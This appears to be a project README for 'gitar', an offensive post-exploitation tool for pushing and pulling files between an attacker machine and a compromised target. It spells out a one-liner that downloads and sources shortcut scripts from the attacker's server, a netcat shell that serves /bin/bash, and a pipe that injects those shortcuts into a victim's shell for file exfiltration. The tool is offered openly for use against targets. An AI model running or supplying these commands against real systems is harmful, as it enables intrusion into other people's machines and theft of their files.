<h1 align=center> 🎸  gitar ⇆</h1>

<div align="center">
<code>
<b>~></b> Have the  <b><i>simplest possible shortcuts </i></b> to upload/download file to/from the <q>target machine</q>

<b>~></b><b><i> No installation needed</i></b> on <q>target machine</q>
</code>
</div>



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** to my attacker machine: `pull [file]`
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a di1rectory** to my attacker machine: `pushr [file]`

*Before be able to use these shortcut you have to [set up](#set-up) both machines. Once again, the aim is to made it as simple as possible*

## Set up

### Pre-requisites

* Network connectivy trough http between attacker & target machine
* On target machine: `nc`,`cat`, `curl` 
	* `tar` for upload directory 

### Steps

 1. <sup>(Attacker machine)</sup> Launch the "server" : `./gitar -e [server_reachable_ip] -p [server_port]`
 2. <sup>(Target machine)</sup> get shortcuts from `/alias` endpoint and source them. The one-liner corresponding would be provided in 1. step: `curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias`

**And that's all, you can now `push`or `pull` file [🎶](#tldr---and-listen-music)**

### Steps with a `nc` reverse shell

**~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*
1. <sup>(Target machine)</sup> Launch your classic listener: `nc -nvlp 4444 -e /bin/bash`
2. <sup>(Attacker machine)</sup> Launch the "server" : `./gitar -e [server_reachable_ip] -p [server_port]`
3.  <sup>(Attacker machine)</sup> Connect to the reverse shell + load shortcut within: `export CMD=[get & source shortcuts one-liner] && (echo $CMD && cat) | nc [VICTIM_IP] 4444`

**And enjoy you revshell [🎶](#tldr---and-listen-music)**

## Enhancement 🛣️

**~>** *All improvements must keep `gitar` simple and don't add unlikely pre-requisites (especially for the target machine)*

**Useful cause we will expose our http server and thus we become the prey**
- HTTPS, basic authent (for the file server part)
- Command line to run server on a docker (or harden `gitar` with seccomp + apparmor + drop capabilities) 

**Improve UX**
- Copy to clipboard "setup shortcut command" when launching gitar
- Soft to workaround limit due to `cat` use for reverse shell connection => autocompletion in reverse shell will not work as we have a pipe not a terminal. (To solve the pb we must have a prgm that creates a pseudoterminal, spawns a program connected to this pseudoterminal [see](https://stackoverflow.com/questions/5843741/how-can-i-pipe-initial-input-into-process-which-will-then-be-interactive) )
- Handle case when curl isn't on target machine (wget version?)
- Download directory support 
- Completion on target shell to help `pull` (path completion)
- An option to directly launch the reverse shell session with shortcut from `gitar`

